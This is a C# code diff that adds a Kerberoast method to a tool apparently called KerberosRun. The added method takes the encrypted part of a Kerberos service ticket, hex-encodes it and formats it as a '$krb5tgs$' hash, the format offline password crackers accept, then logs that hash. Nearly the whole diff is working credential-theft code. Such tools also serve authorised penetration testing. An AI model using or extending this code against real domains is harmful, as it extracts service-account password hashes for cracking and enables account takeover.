@@ -31,6 +31,18 @@ namespace KerberosRun
         }
 
 
+        public void Kerberoast(TGT tgt)
+        {
+             var encType = (int)Enum.Parse(typeof(EncryptionType), tgt.asRep.Ticket.EncryptedPart.EType.ToString());
+
+            var myCipher = (BitConverter.ToString(tgt.asRep.Ticket.EncryptedPart.Cipher.ToArray())).Replace("-", "");
+
+            var kroasthash = string.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, tgt.asRep.Ticket.SName.Name[0], tgt.asRep.CRealm, KerberosRun.SPN, myCipher.Substring(0, 32), myCipher.Substring(32));
+
+            logger.Info("[*] SPN: {0}", KerberosRun.SPN);
+            logger.Info($"    {kroasthash}");
+        }
+
         public void Kerberoast()
         {
             logger.Info("[*] Kerberoasting using KerberosRequestorSecurityToken method");
